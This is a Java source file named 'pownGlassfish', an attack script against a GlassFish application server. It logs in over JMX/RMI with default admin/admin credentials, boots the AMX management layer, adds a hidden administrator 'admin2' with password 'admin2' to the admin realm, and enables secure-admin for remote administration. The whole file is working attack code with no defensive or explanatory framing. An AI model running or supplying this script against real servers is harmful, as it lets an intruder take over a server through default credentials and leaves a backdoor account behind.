
import java.util.HashMap;
import java.util.Map;
import javax.management.Attribute;
import javax.management.AttributeList;
import javax.management.MBeanServerConnection;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;

public class pownGlassfish {

      public static void main(String[] args) throws Exception {
       
       /* Connexion : chagne the URM*/
        JMXServiceURL url = new JMXServiceURL("service:jmx:rmi://myhost.net/jndi/rmi://myhost.net:8686/myhost.net/7676/jmxrmi");
        JMXConnector jmxc = null ;
                    
        // Connexion with credentials
        Map env = new HashMap();
		String[] creds = {"admin","admin"};
		env.put(JMXConnector.CREDENTIALS, creds);
        jmxc = JMXConnectorFactory.connect(url, env);
                             
		 MBeanServerConnection mbsc = jmxc.getMBeanServerConnection(); 
		 
		 String query = "amx-support:type=boot-amx";
		 ObjectName queryName = new ObjectName(query);
		 Object[] para = new Object[0];
	     String[] sign = new String[0]; 
		 mbsc.invoke(queryName, "bootAMX",para, sign);
		 System.out.println("BootAMX OK");
		
	
/*******************************************/
/* Managment of user of realm admin         */
/*******************************************/ 

		 query = "amx:pp=/ext,type=realms";
		 queryName = new ObjectName(query);
		 Object[] z = new Object[]{"admin-realm","admin2","admin2",new String[]{"asadmin"}};
		 String[] b = new String[]{"java.lang.String","java.lang.String","java.lang.String","[Ljava.lang.String;"}; 
		  mbsc.invoke(queryName, "addUser",z, b);
		 
		 query = "amx:pp=/ext,type=realms";
		 queryName = new ObjectName(query);
	
			
		 AttributeList attList = new AttributeList();

 /**********************************/
 /*  Secure-admin     Activation   */
 /**********************************/
		 
		 query = "amx:pp=/domain,type=secure-admin";
		 queryName = new ObjectName(query);
		 attList = new AttributeList();
		 attList.add(new Attribute("Enabled","true"));				 
		 mbsc.invoke(queryName, "setAttributesTransactionally",new Object[]{attList}, new String[]{"javax.management.AttributeList"});
		 System.out.println("Secure admin activate");
		 
        jmxc.close();

    }

}
